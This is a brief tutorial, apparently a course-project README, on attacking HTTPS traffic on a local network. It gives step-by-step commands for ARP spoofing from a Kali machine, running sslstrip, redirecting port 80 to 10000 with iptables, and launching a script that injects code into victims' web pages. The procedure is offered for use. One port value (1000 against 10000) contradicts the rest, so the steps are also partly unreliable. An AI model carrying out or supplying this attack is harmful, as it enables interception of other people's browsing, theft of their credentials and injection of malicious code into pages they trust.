Achieving HTTPs by-passer and injecting code in an HTTPs web page.

It is easy to inject a code in an HTTP web page, but slightly difficult to achieve the same for HTTPs web pages. Follow the following steps to do so.

1) Open your Kali Machine, navigate to 'ARP_spoof.py' file, flush the IP tables by using command: iptables --flush
2) Execute ARP_spoof.py using command: python3 ARP_spoof.py
3) Run SSL Strip, using command: sslstrip

Note: Port 80 on a PC is used for web servers, while SSL strip works for packets coming at port 10000. Any other packet received at any other port will be ignored. So we need to direct our packets to 10000, where SSL strip is working.

4) We achieve the above-specified redirection using command: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

5) Navigate to the file containing the code for code injector. 

Note: Before executing the code for code injector, change the port from 80 to 1000.

Execute the file using command python3 code_injector.py.

